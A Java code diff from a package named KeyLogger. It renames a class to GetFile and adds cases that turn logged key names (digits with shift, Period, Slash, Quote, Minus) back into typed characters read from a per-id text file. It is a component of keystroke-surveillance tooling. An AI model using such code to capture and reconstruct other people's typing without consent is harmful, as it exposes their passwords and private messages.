@@ -3,7 +3,7 @@ package com.client.liveowl.KeyLogger;
 import java.io.*;
 import java.net.Socket;
 
-public class FTPDownloadFile {
+public class GetFile {
 public void downloadFile(String id) {
     String filepath = "D:/" + id + ".txt";
     StringBuilder code = new StringBuilder();
@@ -52,6 +52,62 @@ public String xuly(String input) {
                         code.append(")");
                         i++;
                         continue;
+                    case "1":
+                        code.append("!");
+                        i++;
+                        continue;
+                    case "2":
+                        code.append("@");
+                        i++;
+                        continue;
+                    case "3":
+                        code.append("#");
+                        i++;
+                        continue;
+                    case "4":
+                        code.append("$");
+                        i++;
+                        continue;
+                    case "5":
+                        code.append("%");
+                        i++;
+                        continue;
+                    case "6":
+                        code.append("^");
+                        i++;
+                        continue;
+                    case "7":
+                        code.append("&");
+                        i++;
+                        continue;
+                    case "8":
+                        code.append("*");
+                        i++;
+                        continue;
+                    case "Comma":
+                        code.append("<");
+                        i++;
+                        continue;
+                    case "Period":
+                        code.append(">");
+                        i++;
+                        continue;
+                    case "Slash":
+                        code.append("?");
+                        i++;
+                        continue;
+                    case "Semicolon":
+                        code.append(":");
+                        i++;
+                        continue;
+                    case "Quote":
+                        code.append("\"");
+                        i++;
+                        continue;
+                    case "Minus":
+                        code.append("_");
+                        i++;
+                        continue;
                     case "Open":
                         code.append("{");
                         i += 2;
@@ -84,6 +140,18 @@ public String xuly(String input) {
                 break;
             case "Comma":
                 code.append(",");
+                break;
+            case "Period":
+                code.append(".");
+                break;
+            case "Slash":
+                code.append("/");
+                break;
+            case "Quote":
+                code.append("'");
+                break;
+            case "Minus":
+                code.append("-");
                 break;
             case "Backspace":
                 if (code.length() > 0) {
